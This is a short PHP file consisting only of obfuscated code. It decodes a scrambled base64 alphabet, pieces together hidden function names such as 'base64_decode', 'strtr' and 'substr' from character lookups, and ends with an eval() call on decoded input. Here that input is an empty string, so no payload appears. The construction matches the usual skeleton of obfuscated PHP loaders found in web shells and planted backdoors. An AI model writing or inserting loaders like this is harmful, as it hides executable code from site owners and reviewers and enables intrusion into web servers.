<?php define('dWXtES0311',__FILE__);$oCugqW=base64_decode("bjF6Yi9tYTVcdnQwaTI4LXB4dXF5KjZscmtkZzlfZWhjc3dvNCtmMzdqUnVFaFp4R2Z0V0FTaVRnQm1zcExlanFhUFVIa256Vkt5UVlsdklyTlhKT0NkTWJjb0Z3RA==");$pcCdny=$oCugqW[3].$oCugqW[6].$oCugqW[33].$oCugqW[30];$FGbpfU=$oCugqW[33].$oCugqW[10].$oCugqW[24].$oCugqW[10].$oCugqW[24];$AaghWj=$FGbpfU[0].$oCugqW[18].$oCugqW[3].$FGbpfU[0].$FGbpfU[1].$oCugqW[24];$GOUmMH=$oCugqW[7].$oCugqW[13];$pcCdny.=$oCugqW[22].$oCugqW[36].$oCugqW[29].$oCugqW[26].$oCugqW[30].$oCugqW[32].$oCugqW[35].$oCugqW[26].$oCugqW[30];eval($pcCdny(""));?>